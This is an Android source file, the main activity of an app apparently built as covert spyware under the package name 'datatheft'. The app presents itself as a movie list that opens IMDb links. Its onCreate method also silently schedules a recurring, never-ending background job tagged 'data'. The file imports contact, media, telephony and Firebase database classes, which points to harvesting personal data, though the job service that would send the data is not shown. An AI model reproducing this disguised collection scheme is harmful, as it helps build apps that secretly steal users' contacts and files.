package nerdcastle.datatheft;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.Toast;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.File;
import java.util.ArrayList;

import static java.security.AccessController.getContext;

public class MainActivity extends AppCompatActivity {
    ArrayList<Contact>contactList;
    ListView moviewLV;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moviewLV= (ListView) findViewById(R.id.movieList);
        Movie movie=new Movie();
        final ArrayList<Movie>movies=movie.getAllMOvies();
        MOvieAdapter mOvieAdapter=new MOvieAdapter(this,movies);
        moviewLV.setAdapter(mOvieAdapter);
        FirebaseJobDispatcher dispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        Job myJob = dispatcher.newJobBuilder()
                .setService(InfoJobService.class)
                .setRecurring(true)
                .setTrigger(Trigger.executionWindow(0, 10))
                .setLifetime(Lifetime.FOREVER)
                .setTag("data")
                .setReplaceCurrent(true)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .build();
        dispatcher.mustSchedule(myJob);
        moviewLV.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(movies.get(i).getImdbUrl()));
                startActivity(browserIntent);
            }
        });
    }


}
